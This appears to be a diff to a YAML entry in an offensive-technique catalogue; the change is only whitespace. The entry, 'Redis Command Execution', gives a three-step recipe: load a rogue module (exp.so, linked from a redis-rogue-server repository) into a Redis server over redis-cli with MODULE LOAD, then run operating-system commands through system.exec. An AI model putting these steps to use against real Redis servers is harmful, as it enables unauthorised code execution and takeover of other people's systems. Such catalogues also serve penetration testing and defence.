@@ -4,10 +4,10 @@ functions:
     - description: Redis Command Execution
       code: |
         (1) Upload a shared library to a know filepath
-        	https://github.com/n0b0dyCN/redis-rogue-server/blob/master/exp.so
+            https://github.com/n0b0dyCN/redis-rogue-server/blob/master/exp.so
 
         (2) redis-cli -h 192.168.208.93
-        	MODULE LOAD <full-path-to-exp.so>/exp.so
+            MODULE LOAD <full-path-to-exp.so>/exp.so
 
         (3) system.exec 'id'
 
